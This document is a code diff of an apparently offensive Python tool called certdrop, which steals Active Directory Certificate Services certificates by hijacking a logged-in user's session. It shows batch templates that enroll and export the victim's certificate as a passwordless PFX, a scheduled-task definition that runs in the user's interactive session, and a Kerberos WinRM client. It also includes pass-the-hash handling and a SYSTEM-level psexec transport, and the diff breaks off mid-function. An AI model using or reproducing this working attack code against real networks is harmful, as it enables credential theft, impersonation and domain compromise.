@@ -2,17 +2,14 @@
 """
 certdrop - ADCS cert theft via scheduled task session hijack
 
-Enumerates active sessions on a target host, lets you pick a user, then
-drops a scheduled task that requests an ADCS certificate as that user
-(running in their live session context) and exports it as a PFX.
-
-Kerberos transport uses pure impacket — no system kerberos libraries required
-(no pykerberos, no libkrb5, no KRB5CCNAME env var hacks).
+Drops a scheduled task that runs in a target user's active session context
+to request an ADCS certificate, export it as PFX, then optionally runs
+certipy to extract the user's NT hash or open an LDAP shell.
 
 Usage:
   certdrop.py TARGET -u USER -p PASS -d DOMAIN --dc-ip DC_IP
   certdrop.py TARGET -u USER -H :NTHASH -d DOMAIN --dc-ip DC_IP
-  certdrop.py TARGET -u USER -p PASS -d DOMAIN --dc-ip DC_IP -k
+  certdrop.py TARGET -u USER -k -d DOMAIN --dc-ip DC_IP
 """
 
 import argparse
@@ -21,32 +18,33 @@ import io
 import ipaddress
 import os
 import re
+import shutil
 import socket
 import struct
+import subprocess
 import sys
 import time
 import uuid
 import warnings
 import xml.etree.ElementTree as ET
-
-warnings.filterwarnings("ignore", category=DeprecationWarning)
-
 from datetime import datetime, timedelta, timezone
 from os import urandom
 
+warnings.filterwarnings("ignore", category=DeprecationWarning)
+
 import requests
-from urllib3 import disable_warnings as _urllib3_disable_warnings
-from urllib3.exceptions import InsecureRequestWarning as _InsecureRequestWarning
-_urllib3_disable_warnings(category=_InsecureRequestWarning)
+from urllib3 import disable_warnings as _dw
+from urllib3.exceptions import InsecureRequestWarning as _IW
+_dw(category=_IW)
 
 import winrm
-
 from impacket.krb5 import constants
-from impacket.krb5.asn1 import AP_REQ, AP_REP, Authenticator, EncAPRepPart, TGS_REP, seq_set
+from impacket.krb5.asn1 import (
+    AP_REQ, AP_REP, Authenticator, EncAPRepPart, TGS_REP, seq_set,
+)
 from impacket.krb5.crypto import Key, _enctype_table
 from impacket.krb5.gssapi import (
-    KRB5_AP_REQ,
-    CheckSumField,
+    KRB5_AP_REQ, CheckSumField,
     GSS_C_CONF_FLAG, GSS_C_INTEG_FLAG, GSS_C_SEQUENCE_FLAG, GSS_C_MUTUAL_FLAG,
     KG_USAGE_INITIATOR_SEAL, KG_USAGE_ACCEPTOR_SEAL,
 )
@@ -57,19 +55,19 @@ from pyasn1.codec.der import encoder, decoder
 from pyasn1.type.univ import noValue, ObjectIdentifier
 
 try:
-    import dns.resolver as _dns_resolver
-    _HAS_DNSPYTHON = True
+    import dns.resolver as _dns
+    HAS_DNS = True
 except ImportError:
-    _HAS_DNSPYTHON = False
+    HAS_DNS = False
 
 try:
     from ldap3 import Server, Connection, NTLM, ALL
-    _HAS_LDAP3 = True
+    HAS_LDAP = True
 except ImportError:
-    _HAS_LDAP3 = False
+    HAS_LDAP = False
 
 
-# ── Templates ─────────────────────────────────────────────────────────────────
+# ── Templates ────────────────────────────────────────────────────────────────
 
 CERT_INF = """\
 [Version]
@@ -94,25 +92,76 @@ OID=1.3.6.1.5.5.7.3.2
 CertificateTemplate = {template}
 """
 
-# findstr covers English ("Cert Hash") and French ("Hach. cert.") locales
 CERT_BAT = """\
 @echo off
 setlocal enabledelayedexpansion
 set "BASE={drop_dir}\\{prefix}"
-certreq -new "%BASE%.inf" "%BASE%.req" > nul
-certreq -submit{ca_flag} "%BASE%.req" "%BASE%.cer" > nul
-certutil -user -addstore my "%BASE%.cer" > nul
+
+certreq -q -new "%BASE%.inf" "%BASE%.req" >nul 2>"%BASE%.log"
+if !ERRORLEVEL! neq 0 (echo FAIL_CERTREQ_NEW>"%BASE%.status" & exit /b 1)
+
+certreq -q -submit{ca_flag} "%BASE%.req" "%BASE%.cer" >nul 2>>"%BASE%.log"
+if not exist "%BASE%.cer" (
+    if exist "%BASE%.rsp" (
+        certreq -q -accept "%BASE%.rsp" >nul 2>>"%BASE%.log"
+        if !ERRORLEVEL! neq 0 (echo FAIL_ACCEPT>"%BASE%.status" & exit /b 1)
+        goto :findhash
+    )
+    echo FAIL_CERTREQ_SUBMIT>"%BASE%.status" & exit /b 1
+)
+
+certutil -user -addstore my "%BASE%.cer" >nul 2>>"%BASE%.log"
+if !ERRORLEVEL! neq 0 (echo FAIL_ADDSTORE>"%BASE%.status" & exit /b 1)
+
+:findhash
 set "HASH="
 for /f "tokens=2 delims=:" %%A in ('certutil -user -store my ^| findstr /r /c:"Hach\\. cert\\." /c:"Cert Hash"') do (
     set "tmp=%%A"
     set "tmp=!tmp: =!"
     set "HASH=!tmp!"
 )
-if "!HASH!"=="" exit /b 1
-certutil -user -repairstore my !HASH! > nul 2>&1
-certutil -user -exportPFX -p "" -f my !HASH! "%BASE%.pfx" NoChain,NoRoot > nul 2>&1
-certutil -user -delstore my !HASH! > nul 2>&1
-if exist "%BASE%.pfx" (exit /b 0) else (exit /b 2)
+
+if "!HASH!"=="" (echo FAIL_NOHASH>"%BASE%.status" & exit /b 1)
+
+certutil -user -repairstore my !HASH! >nul 2>&1
+certutil -user -exportPFX -p "" -f my !HASH! "%BASE%.pfx" NoChain,NoRoot >nul 2>>"%BASE%.log"
+certutil -user -delstore my !HASH! >nul 2>&1
+
+if exist "%BASE%.pfx" (
+    echo OK>"%BASE%.status"
+    exit /b 0
+) else (
+    echo FAIL_EXPORT>"%BASE%.status"
+    exit /b 2
+)
+"""
+
+CERT_BAT_PHASE1 = """\
+@echo off
+setlocal enabledelayedexpansion
+set "BASE={drop_dir}\\{prefix}"
+certreq -q -new "%BASE%.inf" "%BASE%.req" >nul 2>"%BASE%.log"
+if !ERRORLEVEL! neq 0 (echo FAIL_CERTREQ_NEW>"%BASE%.status" & exit /b 1)
+echo OK_REQ>"%BASE%.status"
+"""
+
+CERT_BAT_PHASE2 = """\
+@echo off
+setlocal enabledelayedexpansion
+set "BASE={drop_dir}\\{prefix}"
+certutil -user -addstore my "%BASE%.cer" >nul 2>"%BASE%.log"
+if !ERRORLEVEL! neq 0 (echo FAIL_ADDSTORE>"%BASE%.status" & exit /b 1)
+set "HASH="
+for /f "tokens=2 delims=:" %%A in ('certutil -user -store my ^| findstr /r /c:"Hach\\. cert\\." /c:"Cert Hash"') do (
+    set "tmp=%%A"
+    set "tmp=!tmp: =!"
+    set "HASH=!tmp!"
+)
+if "!HASH!"=="" (echo FAIL_NOHASH>"%BASE%.status" & exit /b 1)
+certutil -user -repairstore my !HASH! >nul 2>&1
+certutil -user -exportPFX -p "" -f my !HASH! "%BASE%.pfx" NoChain,NoRoot >nul 2>>"%BASE%.log"
+certutil -user -delstore my !HASH! >nul 2>&1
+if exist "%BASE%.pfx" (echo OK>"%BASE%.status" & exit /b 0) else (echo FAIL_EXPORT>"%BASE%.status" & exit /b 2)
 """
 
 TASK_XML = """\
@@ -124,8 +173,9 @@ TASK_XML = """\
    </RegistrationTrigger>
 </Triggers>
 <Principals>
-   <Principal id="LocalSystem">
+   <Principal id="Author">
    <UserId>{domain}\\{username}</UserId>
+   <LogonType>InteractiveToken</LogonType>
    <RunLevel>HighestAvailable</RunLevel>
    </Principal>
 </Principals>
@@ -147,7 +197,7 @@ TASK_XML = """\
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
 </Settings>
-<Actions Context="LocalSystem">
+<Actions Context="Author">
    <Exec>
    <Command>{exec_cmd}</Command>
    <Arguments>{exec_args}</Arguments>
@@ -176,8 +226,25 @@ Set oShell = CreateObject("WScript.Shell")
 oShell.Run "cmd.exe /c {drop_dir}\\{prefix}.bat", 0, True
 """
 
+STATUS_MESSAGES = {
+    "OK": "Certificate enrolled and exported successfully",
+    "FAIL_CERTREQ_NEW": "certreq -new failed (bad INF or crypto provider issue)",
+    "FAIL_CERTREQ_SUBMIT": "certreq -submit failed (CA unreachable, template denied, or enrollment rejected)",
+    "FAIL_ADDSTORE": "certutil -addstore failed (cert import to user store failed)",
+    "FAIL_NOHASH": "No cert hash found (enrollment may have been silently denied)",
+    "FAIL_EXPORT": "PFX export failed (key not exportable or store corruption)",
+    "FAIL_ACCEPT": "certreq -accept failed (could not install CA response)",
+}
 
-# ── DNS / hostname resolution ─────────────────────────────────────────────────
+
+# ── Output helpers ───────────────────────────────────────────────────────────
+
+def info(msg):  print(f"  [+] {msg}")
+def warn(msg):  print(f"  [!] {msg}", file=sys.stderr)
+def die(msg):   print(f"  [-] {msg}", file=sys.stderr); sys.exit(1)
+
+
+# ── DNS / hostname resolution ───────────────────────────────────────────────
 
 def _is_ip(s):
     try:
@@ -188,13 +255,12 @@ def _is_ip(s):
 
 
 def resolve_target(target, dc_ip, domain):
-    """Returns (hostname_fqdn, ip)."""
     if _is_ip(target):
         ip = target
         hostname = None
-        if _HAS_DNSPYTHON and dc_ip:
+        if HAS_DNS and dc_ip:
             try:
-                r = _dns_resolver.Resolver()
+                r = _dns.Resolver()
                 r.nameservers = [dc_ip]
                 arpa = ".".join(reversed(ip.split("."))) + ".in-addr.arpa"
                 hostname = str(r.resolve(arpa, "PTR")[0]).rstrip(".")
@@ -206,14 +272,27 @@ def resolve_target(target, dc_ip, domain):
             except Exception:
                 pass
         if not hostname:
-            die(f"Cannot resolve hostname for {ip}. Use a hostname instead of IP.")
+            try:
+                smb = SMBConnection(ip, ip, timeout=5)
+                smb.login("", "")
+            except Exception:
+                pass
+            try:
+                hostname = smb.getServerName()
+                if domain and "." not in hostname:
+                    hostname = f"{hostname}.{domain}"
+            except Exception:
+                pass
+        if not hostname:
+            warn(f"Cannot resolve hostname for {ip} — using IP directly (Kerberos may fail)")
+            hostname = ip
         return hostname, ip
     else:
         hostname = target if "." in target else f"{target}.{domain}"
         ip = None
-        if _HAS_DNSPYTHON and dc_ip:
+        if HAS_DNS and dc_ip:
             try:
-                r = _dns_resolver.Resolver()
+                r = _dns.Resolver()
                 r.nameservers = [dc_ip]
                 ip = str(r.resolve(hostname, "A")[0])
             except Exception:
@@ -224,16 +303,15 @@ def resolve_target(target, dc_ip, domain):
             except Exception:
                 pass
         if not ip:
-            die(f"Cannot resolve {hostname}. Check --dc-ip or your DNS.")
+            die(f"Cannot resolve {hostname}. Check --dc-ip or DNS.")
         return hostname, ip
 
 
-# ── GSSAPI token helpers ──────────────────────────────────────────────────────
+# ── GSSAPI token helpers ────────────────────────────────────────────────────
 
-def _krb5_tok_encode(data):
-    """Wrap data in a GSSAPI mech-independent token for Kerberos 5 (RFC 2743 §3.1)."""
+def _gss_encode(data):
     oid_bytes = encoder.encode(ObjectIdentifier((1, 2, 840, 113554, 1, 2, 2)))
-    payload   = oid_bytes + data
+    payload = oid_bytes + data
     n = len(payload)
     if n < 128:
         size = bytes([n])
@@ -244,85 +322,65 @@ def _krb5_tok_encode(data):
     return b'\x60' + size + payload
 
 
-def _krb5_tok_decode(data):
-    """Return payload bytes after the OID in a GSSAPI mech-independent token."""
-    # data[0]=0x60 tag; data[1] is short-form length (<128) or 0x80|num_length_bytes
+def _gss_decode(data):
     if data[1] < 128:
-        skip = 2                         # tag + 1-byte length
+        skip = 2
     else:
-        skip = 2 + (data[1] - 128)      # tag + length_indicator + extra length bytes
+        skip = 2 + (data[1] - 128)
     _, rest = decoder.decode(data[skip:], asn1Spec=ObjectIdentifier())
     return bytes(rest)
 
 
-# ── Pure-impacket WinRM + Kerberos ───────────────────────────────────────────
+# ── Pure-impacket Kerberos WinRM ─────────────────────────────────────────────
 
-class _WinRMResult:
-    def __init__(self, stdout, stderr, rc):
-        self.std_out = stdout    # bytes
-        self.std_err = stderr    # bytes
-        self.status_code = rc    # int
+class _ExecResult:
+    __slots__ = ("std_out", "std_err", "status_code")
+    def __init__(self, out, err, rc):
+        self.std_out = out
+        self.std_err = err
+        self.status_code = rc
 
 
 class KerbWinRM:
-    """
-    WinRM over pure-impacket Kerberos — no system kerberos libraries required.
-
-    Auth flow (RFC 4120 + RFC 4121):
-      1. getKerberosTGT → TGT from KDC
-      2. getKerberosTGS → TGS for http/<hostname>
-      3. Build AP_REQ with a random AES-256 subkey in the Authenticator
-         (forces server to respond with AES-256 in AP_REP)
-      4. POST Authorization: Kerberos <GSSAPI(AP_REQ)>
-         → server returns WWW-Authenticate: Kerberos <GSSAPI(AP_REP)>
-      5. Decrypt AP_REP → extract session subkey
-      6. All subsequent SOAP requests encrypted with RFC 4121 GSS wrap tokens
-         using the AP_REP subkey (KG_USAGE_INITIATOR_SEAL / ACCEPTOR_SEAL)
-    """
-
     _ANON     = 'http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous'
     _CMD_URI  = 'http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd'
     _RSP_NS   = 'http://schemas.microsoft.com/wbem/wsman/1/windows/shell'
-    _CMD_DONE = ('http://schemas.microsoft.com/wbem/wsman/1/windows/shell'
-                 '/CommandState/Done')
     _BOUNDARY = b'--Encrypted Boundary'
     _PROTO    = 'application/HTTP-Kerberos-session-encrypted'
 
-    def __init__(self, hostname, ip, username, password, nt_hash, domain, dc_ip):
-        self.hostname  = hostname
-        self.ip        = ip
-        self.username  = username
-        self.password  = password
-        self.nt_hash   = nt_hash
-        self.domain    = domain
-        self.dc_ip     = dc_ip
-        self._sess     = None   # requests.Session (persistent connection)
-        self._subkey   = None   # Key extracted from AP_REP
-        self._cipher   = None   # AES cipher object for subkey
-        self._tgs_key  = None
+    def __init__(self, hostname, ip, username, password, nt_hash, domain,
+                 dc_ip, aes_key="", port=5985):
+        self.hostname = hostname
+        self.ip       = ip
+        self.username = username
+        self.password = password
+        self.nt_hash  = nt_hash
+        self.domain   = domain
+        self.dc_ip    = dc_ip
+        self.aes_key  = aes_key
+        self.port     = port
+        self._sess    = None
+        self._subkey  = None
+        self._cipher  = None
+        self._tgs_key = None
         self._tgs_cipher = None
-        self._seq_cli  = 0
-        self._seq_srv  = 0
+        self._seq_cli = 0
+        self._seq_srv = 0
         self._shell_id = None
 
-    # ── Public API ────────────────────────────────────────────────────────────
-
     def connect(self):
-        """Full Kerberos auth handshake + open CMD shell."""
         self._sess = requests.Session()
         self._sess.verify = False
-        gssapi_token = self._build_ap_req()
-        self._do_ap_rep(gssapi_token)
+        tok = self._build_ap_req()
+        self._do_ap_rep(tok)
         self._shell_id = self._create_shell()
 
     def run_cmd(self, cmd):
-        """Run a command via the CMD shell. Returns _WinRMResult."""
-        cmd_id = self._execute(self._shell_id, cmd)
-        stdout, stderr, rc = self._receive_all(self._shell_id, cmd_id)
-        return _WinRMResult(stdout, stderr, rc)
+        cid = self._execute(self._shell_id, cmd)
+        out, err, rc = self._receive_all(self._shell_id, cid)
+        return _ExecResult(out, err, rc)
 
     def run_ps(self, ps_code):
-        """Run PowerShell code via EncodedCommand. Returns _WinRMResult."""
         enc = base64.b64encode(ps_code.encode('utf-16-le')).decode()
         return self.run_cmd(f'powershell -NonInteractive -EncodedCommand {enc}')
 
@@ -337,132 +395,119 @@ class KerbWinRM:
             self._sess.close()
             self._sess = None
 
-    # ── Kerberos auth ─────────────────────────────────────────────────────────
-
     def _build_ap_req(self):
-        """TGT → TGS → AP_REQ with random AES-256 subkey. Returns GSSAPI token bytes."""
         lm_hash = b''
-        nt_hash  = b''
+        nt_hash = b''
+        aes_key = b''
         if self.nt_hash:
             parts = self.nt_hash.split(':')
             if len(parts) == 2 and parts[0]:
                 lm_hash = bytes.fromhex(parts[0])
             nt_hash = bytes.fromhex(parts[-1])
+        if self.aes_key:
+            aes_key = bytes.fromhex(self.aes_key)
 
         user = Principal(self.username,
                          type=constants.PrincipalNameType.NT_PRINCIPAL.value)
         tgt, tgt_cipher, _, tgt_key = getKerberosTGT(
             user, self.password or '', self.domain,
-            lm_hash, nt_hash, b'', self.dc_ip)
+            lm_hash, nt_hash, aes_key, self.dc_ip)
 
         spn = Principal(f'http/{self.hostname}',
                         type=constants.PrincipalNameType.NT_SRV_INST.value)
         tgs_raw, tgs_cipher, _, tgs_key = getKerberosTGS(
             spn, self.domain, self.dc_ip, tgt, tgt_cipher, tgt_key)
 
-        self._tgs_key    = tgs_key
+        self._tgs_key = tgs_key
         self._tgs_cipher = tgs_cipher
 
         tgs_rep = decoder.decode(tgs_raw, asn1Spec=TGS_REP())[0]
-        ticket  = Ticket()
+        ticket = Ticket()
         ticket.from_asn1(tgs_rep['ticket'])
 
         chk = CheckSumField()
-        chk['Lgth']  = 16
+        chk['Lgth'] = 16
         chk['Flags'] = (GSS_C_CONF_FLAG | GSS_C_INTEG_FLAG |
                         GSS_C_SEQUENCE_FLAG | GSS_C_MUTUAL_FLAG)
 
-        now  = datetime.now(timezone.utc)
+        now = datetime.now(timezone.utc)
         auth = Authenticator()
-        auth['authenticator-vno']  = 5
-        auth['crealm']             = self.domain.upper()
+        auth['authenticator-vno'] = 5
+        auth['crealm'] = self.domain.upper()
         seq_set(auth, 'cname', user.components_to_asn1)
-        auth['cusec']              = now.microsecond
-        auth['ctime']              = KerberosTime.to_asn1(now)
-        auth['cksum']              = noValue
+        auth['cusec'] = now.microsecond
+        auth['ctime'] = KerberosTime.to_asn1(now)
+        auth['cksum'] = noValue
         auth['cksum']['cksumtype'] = 0x8003
-        auth['cksum']['checksum']  = chk.getData()
-        auth['seq-number']         = 0
-        # Random AES-256 subkey: forces server to use AES-256 in AP_REP
-        auth['subkey']             = noValue
+        auth['cksum']['checksum'] = chk.getData()
+        auth['seq-number'] = 0
+        auth['subkey'] = noValue
         auth['subkey']['keyvalue'] = urandom(32)
-        auth['subkey']['keytype']  = 18   # AES256-CTS-HMAC-SHA1-96
+        auth['subkey']['keytype'] = 18
 
         enc_auth = tgs_cipher.encrypt(tgs_key, 11, encoder.encode(auth), None)
 
         ap_req = AP_REQ()
-        ap_req['pvno']     = 5
+        ap_req['pvno'] = 5
         ap_req['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
         ap_req['ap-options'] = constants.encodeFlags(
             [constants.APOptions.mutual_required.value])
         seq_set(ap_req, 'ticket', ticket.to_asn1)
-        ap_req['authenticator']           = noValue
-        ap_req['authenticator']['etype']  = tgs_cipher.enctype
+        ap_req['authenticator'] = noValue
+        ap_req['authenticator']['etype'] = tgs_cipher.enctype
         ap_req['authenticator']['cipher'] = enc_auth
 
-        return _krb5_tok_encode(KRB5_AP_REQ + encoder.encode(ap_req))
+        return _gss_encode(KRB5_AP_REQ + encoder.encode(ap_req))
 
     def _do_ap_rep(self, gssapi_token):
-        """Send AP_REQ, receive and decrypt AP_REP, extract session subkey."""
         resp = self._sess.post(
-            f'http://{self.ip}:5985/wsman',
+            f'http://{self.ip}:{self.port}/wsman',
             headers={'Authorization': 'Kerberos ' + base64.b64encode(gssapi_token).decode()},
         )
-
         www_auth = resp.headers.get('WWW-Authenticate', '')
         if not www_auth.startswith('Kerberos '):
             raise RuntimeError(
                 f'Kerberos auth failed (HTTP {resp.status_code}): '
                 f'WWW-Authenticate={www_auth!r}')
 
-        ap_rep_gssapi = base64.b64decode(www_auth[9:])  # strip 'Kerberos '
-        ap_rep_bytes  = _krb5_tok_decode(ap_rep_gssapi)
+        ap_rep_gssapi = base64.b64decode(www_auth[9:])
+        ap_rep_bytes = _gss_decode(ap_rep_gssapi)
         ap_rep = decoder.decode(ap_rep_bytes[2:], asn1Spec=AP_REP())[0]
 
-        # Decrypt AP_REP enc-part with TGS session key (key usage 12)
         rep_plain = self._tgs_cipher.decrypt(
             self._tgs_key, 12, bytes(ap_rep['enc-part']['cipher']))
         rep_dec = decoder.decode(rep_plain, asn1Spec=EncAPRepPart())[0]
 
         keydata = bytes(rep_dec['subkey']['keyvalue'])
         keytype = int(rep_dec['subkey']['keytype'])
-        self._subkey  = Key(keytype, keydata)
-        self._cipher  = _enctype_table[keytype]
+        self._subkey = Key(keytype, keydata)
+        self._cipher = _enctype_table[keytype]
         self._seq_cli = 0
         self._seq_srv = int(rep_dec['seq-number'])
 
-    # ── RFC 4121 §4.2.4 wrap / unwrap ────────────────────────────────────────
-
     def _wrap(self, plaintext):
-        """GSS wrap using AP_REP subkey. Returns (sig_bytes, enc_bytes)."""
-        # Append inner header, encrypt, right-rotate ciphertext by RRC=28
         inner = struct.pack('>BBBBHHQ', 5, 4, 6, 0xff, 0, 0, self._seq_cli)
-        enc   = self._cipher.encrypt(self._subkey, KG_USAGE_INITIATOR_SEAL,
-                                     plaintext + inner, None)
+        enc = self._cipher.encrypt(self._subkey, KG_USAGE_INITIATOR_SEAL,
+                                   plaintext + inner, None)
         rot = len(enc) - (28 % len(enc))
         enc = enc[rot:] + enc[:rot]
         sig = struct.pack('>BBBBHHQ', 5, 4, 6, 0xff, 0, 28, self._seq_cli)
         self._seq_cli += 1
-        # Split: outer header (16) + first 44 bytes of rotated ciphertext = signature (60 bytes)
         return sig + enc[:44], enc[44:]
 
     def _unwrap(self, sig, enc):
-        """GSS unwrap server message. sig=60 bytes (header+prefix), enc=remainder."""
         _, _, _, _, ec, rrc, _ = struct.unpack('>BBBBHHQ', sig[:16])
         blob = sig[16:] + enc
-        rot  = (rrc + ec) % len(blob)
+        rot = (rrc + ec) % len(blob)
         blob = blob[rot:] + blob[:rot]
         plaintext = self._cipher.decrypt(self._subkey, KG_USAGE_ACCEPTOR_SEAL, blob)
         return plaintext[:-(ec + 16)]
 
-    # ── HTTP transport ────────────────────────────────────────────────────────
-
     def _build_multipart(self, soap_bytes):
-        """Wrap soap_bytes in multipart/x-multi-encrypted body (MS-WSMV §2.2.9.1.2)."""
         sig, enc = self._wrap(soap_bytes)
-        payload  = struct.pack('<I', len(sig)) + sig + enc
+        payload = struct.pack('<I', len(sig)) + sig + enc
         orig_len = str(len(soap_bytes)).encode()
-        proto    = self._PROTO.encode()
+        proto = self._PROTO.encode()
         return (
             self._BOUNDARY + b'\r\n'
             b'Content-Type: ' + proto + b'\r\n'
@@ -475,59 +520,48 @@ class KerbWinRM:
         )
 
     def _parse_multipart(self, body_bytes):
-        """Decrypt multipart/encrypted response body. Returns plaintext bytes."""
         for ct_marker in (
             b'\r\nContent-Type: application/octet-stream\r\n',
             b'\r\n\tContent-Type: application/octet-stream\r\n',
         ):
             if ct_marker not in body_bytes:
                 continue
-            start   = body_bytes.index(ct_marker) + len(ct_marker)
+            start = body_bytes.index(ct_marker) + len(ct_marker)
             payload = body_bytes[start:]
-            # Strip closing boundary — server may or may not prefix it with \r\n
             for closing in (b'\r\n' + self._BOUNDARY + b'--\r\n',
                             self._BOUNDARY + b'--\r\n'):
                 if payload.endswith(closing):
                     payload = payload[:-len(closing)]
                     break
             sig_len = struct.unpack('<I', payload[:4])[0]
-            sig     = payload[4:4 + sig_len]
-            enc     = payload[4 + sig_len:]
+            sig = payload[4:4 + sig_len]
+            enc = payload[4 + sig_len:]
             return self._unwrap(sig, enc)
-        return body_bytes  # fallback
+        return body_bytes
 
     def _send(self, soap_xml):
-        """Encrypt SOAP, POST, decrypt response. Returns XML str."""
         soap_bytes = soap_xml.encode('utf-8')
         body = self._build_multipart(soap_bytes)
-        ct   = (
-            f'multipart/encrypted;'
-            f'protocol="{self._PROTO}";'
-            f'boundary="Encrypted Boundary"'
-        )
+        ct = (f'multipart/encrypted;'
+              f'protocol="{self._PROTO}";'
+              f'boundary="Encrypted Boundary"')
         resp = self._sess.post(
-            f'http://{self.ip}:5985/wsman',
-            data=body,
-            headers={'Content-Type': ct},
+            f'http://{self.ip}:{self.port}/wsman',
+            data=body, headers={'Content-Type': ct},
         )
         if resp.status_code not in (200, 500):
             raise RuntimeError(
                 f'WinRM HTTP {resp.status_code}: '
                 f'{resp.content[:300].decode(errors="replace")}')
-
         if not resp.content.strip():
             return ''
-
         if self._BOUNDARY in resp.content:
             result = self._parse_multipart(resp.content)
         else:
             result = resp.content
-
         if isinstance(result, bytes):
             result = result.decode('utf-8', errors='replace')
         return result.strip()
-
-    # ── SOAP helpers ──────────────────────────────────────────────────────────
 
     @staticmethod
     def _xe(s):
@@ -535,9 +569,9 @@ class KerbWinRM:
                  .replace('>', '&gt;').replace('"', '&quot;'))
 
     def _envelope(self, action, selector=None, opts='', body=''):
-        sel = (f'    <w:SelectorSet>'
+        sel = (f'<w:SelectorSet>'
                f'<w:Selector Name="ShellId">{selector}</w:Selector>'
-               f'</w:SelectorSet>\n') if selector else ''
+               f'</w:SelectorSet>') if selector else ''
         return (
             f'<?xml version="1.0" encoding="UTF-8"?>'
             f'<s:Envelope'
@@ -546,7 +580,7 @@ class KerbWinRM:
             f' xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"'
             f' xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">'
             f'<s:Header>'
-            f'<a:To>http://{self.hostname}:5985/wsman</a:To>'
+            f'<a:To>http://{self.hostname}:{self.port}/wsman</a:To>'
             f'<a:ReplyTo><a:Address s:mustUnderstand="true">{self._ANON}</a:Address></a:ReplyTo>'
             f'<a:MessageID>uuid:{uuid.uuid4()}</a:MessageID>'
             f'<a:Action s:mustUnderstand="true">{action}</a:Action>'
@@ -557,8 +591,6 @@ class KerbWinRM:
             f'<s:Body>{body}</s:Body>'
             f'</s:Envelope>'
         )
-
-    # ── WinRM operations ──────────────────────────────────────────────────────
 
     def _create_shell(self):
         opts = ('<w:OptionSet>'
@@ -577,7 +609,6 @@ class KerbWinRM:
         sh = root.find('.//{%s}ShellId' % self._RSP_NS)
         if sh is not None:
             return sh.text
-        # Fallback: regex search
         m = re.search(r'<[^>]*ShellId[^>]*>([^<]+)<', resp)
         if m:
             return m.group(1)
@@ -609,7 +640,6 @@ class KerbWinRM:
             selector=shell_id, body=body)
         resp = self._send(xml)
         root = ET.fromstring(resp)
-
         stdout = b''
         stderr = b''
         for s in root.findall('.//{%s}Stream' % self._RSP_NS):
@@ -619,18 +649,15 @@ class KerbWinRM:
                     stdout += data
                 elif s.get('Name') == 'stderr':
                     stderr += data
-
         rc = None
         for state in root.findall('.//{%s}CommandState' % self._RSP_NS):
             if 'Done' in state.get('State', ''):
                 el = state.find('{%s}ExitCode' % self._RSP_NS)
                 rc = int(el.text) if el is not None else 0
-
         return stdout, stderr, rc
 
     def _receive_all(self, shell_id, cmd_id):
-        out = b''
-        err = b''
+        out, err = b'', b''
         while True:
             o, e, rc = self._receive_once(shell_id, cmd_id)
             out += o
@@ -645,49 +672,274 @@ class KerbWinRM:
         self._send(xml)
 
 
-# ── NTLM WinRM (via pywinrm) ─────────────────────────────────────────────────
+# ── Transport layer ──────────────────────────────────────────────────────────
 
-def winrm_session(hostname, ip, username, password, nt_hash, domain, dc_ip, use_krb):
-    """Return either a KerbWinRM (Kerberos) or pywinrm Session (NTLM)."""
+def _run(transport, cmd):
+    r = transport.run_cmd(cmd)
+    if isinstance(r, tuple):
+        return r
+    out = r.std_out if isinstance(r.std_out, str) else r.std_out.decode(errors="replace")
+    err = r.std_err if isinstance(r.std_err, str) else r.std_err.decode(errors="replace")
+    return out, err, r.status_code
+
+
+def _run_ps(transport, ps):
+    r = transport.run_ps(ps)
+    if isinstance(r, tuple):
+        return r
+    out = r.std_out if isinstance(r.std_out, str) else r.std_out.decode(errors="replace")
+    err = r.std_err if isinstance(r.std_err, str) else r.std_err.decode(errors="replace")
+    return out, err, r.status_code
+
+
+def connect_winrm(hostname, ip, username, password, nt_hash, domain,
+                  dc_ip, aes_key, use_krb, port=5985):
     if use_krb:
-        k = KerbWinRM(hostname, ip, username, password, nt_hash, domain, dc_ip)
+        k = KerbWinRM(hostname, ip, username, password, nt_hash, domain,
+                      dc_ip, aes_key, port)
         k.connect()
         return k
+    url = f"http://{ip}:{port}/wsman"
+    if nt_hash and not password:
+        nt = nt_hash.split(":")[-1]
+        lm = "0" * 32
+        ntlm_file = os.path.join(
+            os.environ.get("TMPDIR", "/tmp"), f".ntlm_{uuid.uuid4().hex[:8]}")
+        with open(ntlm_file, "w") as f:
+            f.write(f"{domain}\\{username}:1000:{lm}:{nt}:[U]:LCT-0\n")
+        os.environ["NTLM_USER_FILE"] = ntlm_file
+    return winrm.Session(url,
+                         auth=(f"{domain}\\{username}", password or ""),
+                         transport="ntlm",
+                         read_timeout_sec=60,
+                         operation_timeout_sec=55)
+
+
+# ── Susinternals transport ───────────────────────────────────────────────────
+
+class SusinternalsExec:
+    def __init__(self, target_ip, username, password, nt_hash, domain,
+                 dc_ip, aes_key, use_krb):
+        self.target_ip = target_ip
+        self.username  = username
+        self.password  = password
+        self.nt_hash   = nt_hash
+        self.domain    = domain
+        self.dc_ip     = dc_ip
+        self.aes_key   = aes_key
+        self.use_krb   = use_krb
+        self._script   = self._find_psexecsvc()
+
+    def _find_psexecsvc(self):
+        candidates = [
+            os.path.join(os.path.dirname(os.path.abspath(__file__)), "psexecsvc.py"),
+            shutil.which("psexecsvc.py") or "",
+        ]
+        for p in candidates:
+            if p and os.path.isfile(p):
+                return p
+        die("psexecsvc.py not found — download from github.com/sensepost/susinternals "
+            "and place alongside certdrop.py")
+
+    def _build_target_str(self):
+        t = f"{self.domain}/{self.username}"
+        if self.password:
+            t += f":{self.password}"
+        t += f"@{self.target_ip}"
+        return t
+
+    def run_cmd(self, cmd):
+        args = [sys.executable, self._script, self._build_target_str(),
+                "-system", "-command", "cmd.exe", "-arguments", f"/c {cmd}"]
+        if self.nt_hash:
+            h = self.nt_hash
+            if ":" not in h:
+                h = f"aad3b435b51404eeaad3b435b51404ee:{h}"
+            args.extend(["-hashes", h])
+        if self.use_krb:
+            args.append("-k")
+        if self.dc_ip:
+            args.extend(["-dc-ip", self.dc_ip])
+        if self.aes_key:
+            args.extend(["-aes-key", self.aes_key])
+        try:
+            r = subprocess.run(args, capture_output=True, text=True, timeout=300)
+            return r.stdout, r.stderr, r.returncode
+        except subprocess.TimeoutExpired:
+            return "", "susinternals: command timed out", 1
+
+    def run_ps(self, ps_code):
+        enc = base64.b64encode(ps_code.encode("utf-16-le")).decode()
